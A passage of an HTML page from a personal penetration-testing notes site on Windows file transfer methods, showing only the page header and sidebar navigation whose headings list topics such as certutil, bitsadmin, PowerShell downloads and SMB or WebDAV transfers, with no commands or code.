@@ -1,0 +1,4510 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../Getting%20Started/Transferring%20Files/">
+      
+      
+        <link rel="next" href="../Linux%20File%20Transfer%20Methods/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.5">
+    
+    
+      
+        <title>Win File Transfer Methods - Pentesting Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.8608ea7d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../styles/custom.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="#00be98" data-md-color-accent="#007e65">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#fileless-threats-and-file-transfer" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Pentesting Notes" class="md-header__button md-logo" aria-label="Pentesting Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pentesting Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Win File Transfer Methods
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="#00be98" data-md-color-accent="#007e65"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="#00be98" data-md-color-accent="#007e65"  aria-label="switch to light mdoe"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="switch to light mdoe" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Pentesting Notes" class="md-nav__button md-logo" aria-label="Pentesting Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Pentesting Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Welcome to My Portfolio
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    CPTS
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            CPTS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Getting Started
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Getting Started
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Web%20Enumeration%20Overview/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Enumeration Overview
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Types%20of%20Shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Types of Shells
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Folder%20Structure/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Folder Structure
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['In-Progress']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Public%20Exploits/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Public Exploits
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Get%20OS%20Information/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Get OS Information
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Way%20Forward/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Way Forward
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['in-progress']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Starting%20Out/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Starting Out
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Common%20Pitfalls%20and%20Troubleshooting%20in%20VPN%20and%20SSH%20Connections/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Pitfalls and Troubleshooting in VPN and SSH Connections
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Transferring%20Files/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Transferring Files
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['in-progress']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    File Transfers
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            File Transfers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Win File Transfer Methods
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Win File Transfer Methods
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#fileless-threats-and-file-transfer" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fileless Threats and File Transfer
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-are-fileless-threats" class="md-nav__link">
+    <span class="md-ellipsis">
+      What Are Fileless Threats?
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#breakdown-of-the-astaroth-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Breakdown of the Astaroth Attack
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#abuse-of-wmic-tool" class="md-nav__link">
+    <span class="md-ellipsis">
+      Abuse of WMIC Tool
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-transfer-via-bitsadmin" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Transfer via Bitsadmin
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#decoding-payloads-with-certutil" class="md-nav__link">
+    <span class="md-ellipsis">
+      Decoding Payloads with Certutil
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#execution-with-regsvr32" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execution with regsvr32
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-payload-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Payload Injection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#visual-representation-of-the-astaroth-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Visual Representation of the Astaroth Attack
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#download-operations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Download Operations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#powershell-based64-encode-decode" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell Based64 Encode &amp; Decode
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PowerShell Based64 Encode & Decode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#steps-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Steps Overview
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#use-case-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Use Case Example:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advantages" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advantages:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwnbox-check-ssh-key-md5-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pwnbox Check SSH Key MD5 Hash
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwnbox-encode-ssh-key-to-base64" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pwnbox Encode SSH Key to Base64
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#confirming-the-md5-hashes-match" class="md-nav__link">
+    <span class="md-ellipsis">
+      Confirming the MD5 Hashes Match
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#notes-on-file-transfer-using-powershell-and-webclient" class="md-nav__link">
+    <span class="md-ellipsis">
+      Notes on File Transfer Using PowerShell and WebClient
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Notes on File Transfer Using PowerShell and WebClient">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#file-transfer-with-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Transfer with PowerShell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="File Transfer with PowerShell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#webclient-methods-for-downloading-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      WebClient Methods for Downloading Data
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-powershell-downloadfile-method" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example: PowerShell DownloadFile Method
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-downloadstring-fileless-method" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell DownloadString-Fileless Method
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-invoke-webrequest" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell Invoke-WebRequest
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-of-commands-by-harmj0y" class="md-nav__link">
+    <span class="md-ellipsis">
+      List of commands by HarmJ0y
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-downloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB Downloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-the-smb-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Create the sMB Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#copy-a-file-from-the-smb-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Copy a File from the SMB Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-the-smb-server-with-a-username-and-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      Create the SMB Server with a Username and Password
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mount-the-smb-server-with-username-and-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mount the SMB Server with Username and Password
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Mount the SMB Server with Username and Password">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#powershell-base64-web-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell Base64 Web Upload
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-1-encoding-the-file-in-base64" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Encoding the File in Base64
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-uploading-the-encoded-file-via-http" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Uploading the Encoded File via HTTP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-catching-the-data-with-netcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Catching the Data with Netcat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-decoding-the-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Decoding the File
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-uploads-via-webdav" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB Uploads via WebDAV
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-webdav-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting Up WebDAV Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#connecting-to-the-webdav-share" class="md-nav__link">
+    <span class="md-ellipsis">
+      Connecting to the WebDAV Share
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-files-via-webdav" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading Files via WebDAV
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ftp-uploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP Uploads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-the-ftp-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting Up the FTP Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-files-via-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading Files via PowerShell
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-an-ftp-command-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      Creating an FTP Command File
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recap
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Linux%20File%20Transfer%20Methods/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux File Transfer Methods
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../file_transfer_operations/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File transfer operations
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../transfer_files_wtih_code/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Transferring Files with Code
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../miscellaneous_file_transfer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Miscellaneous file transfer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protected_file_transfer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Protected file transfer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../catching_files_over_HTTPS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    catching files over HTTPS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../detection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Detection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../living_off_the_land/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Living off the land
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../evasion_detection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Evasion detection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Shells and Payloads
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Shells and Payloads
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/understanding_shells_and_payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Understanding Shells and Payloads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/CAT5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CAT5 Security's Engagement Preparation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/anatomy_of_a_shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Anatomy of a shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/bind_shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bind shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/reverseshell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reverseshell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/Payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Payloads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/Infiltrating-Unix-Linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Infiltrating Unix Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
